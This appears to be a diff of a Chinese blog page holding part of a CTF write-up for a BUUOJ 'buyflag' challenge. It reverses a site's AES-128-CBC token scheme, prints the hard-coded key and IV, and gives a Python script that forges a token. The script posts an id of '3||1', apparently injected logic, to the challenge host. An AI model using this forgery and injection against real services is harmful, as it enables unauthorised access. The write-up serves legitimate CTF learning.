class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (;;) <span class="keyword">switch</span> (o.prev = o.next) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> o.abrupt(<span class="string">"return"</span>, <span class="keyword">new</span> s.a((<span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">var</span> n = p.a.createCipheriv(<span class="string">"aes-128-cbc"</span>, e, i),</span><br><span class="line">                    r = n.update(t, <span class="string">"utf8"</span>, <span class="string">"binary"</span>);</span><br><span class="line">                    r += n.final(<span class="string">"binary"</span>),</span><br><span class="line">                    o(r = <span class="keyword">new</span> Buffer.from(r, <span class="string">"binary"</span>).toString(<span class="string">"hex"</span>))</span><br><span class="line">                &#125;)));</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"end"</span>:</span><br><span class="line">                <span class="keyword">return</span> o.stop()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;), n, o)</span><br><span class="line">    &#125;)))()</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
-
+<pre><code class="js">encrypt: function(e, i, t) {
+    var o = this;
+    return c()(a.a.mark((function n() {
+        return a.a.wrap((function(o) {
+            for (;;) switch (o.prev = o.next) {
+            case 0:
+                return o.abrupt(&quot;return&quot;, new s.a((function(o) {
+                    var n = p.a.createCipheriv(&quot;aes-128-cbc&quot;, e, i),
+                    r = n.update(t, &quot;utf8&quot;, &quot;binary&quot;);
+                    r += n.final(&quot;binary&quot;),
+                    o(r = new Buffer.from(r, &quot;binary&quot;).toString(&quot;hex&quot;))
+                })));
+            case 1:
+            case &quot;end&quot;:
+                return o.stop()
+            }
+        }), n, o)
+    })))()
+},</code></pre>
 <p>所以 token 使用了 <code>aes-128-cbc</code> 进行对经过了 <code>o=f()(n()(e))</code> 处理的 json 进行加密，key 是 <code>31169fedc9a20ecf</code>，iv 是 <code>d96adeefaa0102a9</code></p>
 <p>随便拿一个 token 试验一下</p>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164157.png" alt="image-20200528150727592"></p>
 <p>32 位的我们拿 md5 测试一下</p>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164154.png" alt="image-20200528150920692"></p>
 <p>可以看到是吻合的，这里贴上脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> time, json, datetime, hashlib</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(raw)</span>:</span></span><br><span class="line">    BS = <span class="number">16</span></span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) </span><br><span class="line">    key = <span class="string">b'31169fedc9a20ecf'</span></span><br><span class="line">    iv = <span class="string">b'd96adeefaa0102a9'</span></span><br><span class="line">    raw = pad(raw).encode()</span><br><span class="line">    cryptor = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">    ciphertext = cryptor.encrypt(raw)</span><br><span class="line">    <span class="keyword">return</span> b2a_hex(ciphertext).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data_token</span><span class="params">()</span>:</span></span><br><span class="line">    dtime = datetime.datetime.now()</span><br><span class="line">    t = int(time.mktime(dtime.timetuple())) * <span class="number">1000</span></span><br><span class="line">    data = json.dumps(&#123;<span class="string">"id"</span>:<span class="string">"3||1"</span>, <span class="string">"timestamp"</span>:t&#125;).replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">    print(<span class="string">"[+] data：%s"</span> % data)</span><br><span class="line">    token = encrypt(hashlib.md5(data.encode()).hexdigest())</span><br><span class="line">    print(<span class="string">"[+] token：%s"</span> % token)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">"Content-Type"</span>: <span class="string">"application/json;charset=UTF-8"</span>,</span><br><span class="line">        <span class="string">"token"</span>:token</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> data, headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://1165bc7f-ecfb-45e8-bbc5-533876f73e8d.node3.buuoj.cn/buyflag"</span></span><br><span class="line">    data, headers = get_data_token()</span><br><span class="line">    res = rq.post(url, data=data, headers=headers)</span><br><span class="line">    print(res.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="python"># coding:utf-8
+from Crypto.Cipher import AES
+from binascii import b2a_hex, a2b_hex
+import time, json, datetime, hashlib
+import requests as rq
 
+def encrypt(raw):
+    BS = 16
+    pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
+    key = b&#39;31169fedc9a20ecf&#39;
+    iv = b&#39;d96adeefaa0102a9&#39;
+    raw = pad(raw).encode()
+    cryptor = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = cryptor.encrypt(raw)
+    return b2a_hex(ciphertext).decode()
+
+def get_data_token():
+    dtime = datetime.datetime.now()
+    t = int(time.mktime(dtime.timetuple())) * 1000
+    data = json.dumps({&quot;id&quot;:&quot;3||1&quot;, &quot;timestamp&quot;:t}).replace(&#39; &#39;,&#39;&#39;)
+    print(&quot;[+] data：%s&quot; % data)
+    token = encrypt(hashlib.md5(data.encode()).hexdigest())
+    print(&quot;[+] token：%s&quot; % token)
+    headers = {
+        &quot;Content-Type&quot;: &quot;application/json;charset=UTF-8&quot;,
+        &quot;token&quot;:token
+    }
+    return data, headers
+
+if __name__== &quot;__main__&quot;:
+    url = &quot;http://1165bc7f-ecfb-45e8-bbc5-533876f73e8d.node3.buuoj.cn/buyflag&quot;
+    data, headers = get_data_token()
+    res = rq.post(url, data=data, headers=headers)
+    print(res.text)
+</code></pre>
 <p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20200528164148.png" alt="image-20200528162837226"></p>
 <blockquote>
 <p>需要注意的是</p>
@@ -702,7 +861,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">30</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -715,7 +874,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -806,6 +965,17 @@
   <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
 -->
 
+
+
+
+
+<!-- Highlight.js -->
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js">
+</script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
 
 
         
